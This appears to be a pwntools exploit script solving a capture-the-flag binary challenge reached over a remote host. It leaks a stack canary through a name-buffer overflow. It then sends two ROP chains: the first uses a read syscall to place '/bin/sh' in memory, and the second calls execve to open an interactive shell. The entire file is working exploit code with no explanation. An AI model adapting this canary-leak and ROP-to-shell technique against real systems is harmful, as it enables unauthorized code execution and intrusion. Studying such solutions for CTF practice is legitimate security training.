from pwn import *
context.log_level="debug"

r=remote("pwn.sixstars.team",22095)
#r=process("./level5.0-oneshot")
#print r.pid
#pause()

sh1='a'*33
r.sendlineafter("name?",sh1)
r.recvuntil(sh1)

a='\x00'+r.recv(3)
a=u32(a)
print hex(a)

p_ebx=p32(0x080481c9)
p_ecx=p32(0x080de6a1)
p_edx=p32(0x0806ed8a)
p_eax=p32(0x080b7f46)
syscall=p32(0x806f3a0)

sh2='b'*0x40+p32(a)+'b'*0xc+p_ebx+p32(0)+p_ecx+p32(0x080e9800)+p_edx+p32(8)+p_eax+p32(0x03)+syscall+p32(0x08048961)

q=p32(0x6e69622f)+p32(0x0068732f)

sh3='a'*32+p32(a)+'a'*0xc+p_ebx+p32(0x080e9800)+p_ecx+p32(0)+p_edx+p32(0)+p_eax+p32(0x0b)+syscall

r.sendlineafter("again!",sh2)

r.send(q)

r.sendlineafter("name?",sh3)
r.sendline('a')
r.interactive()
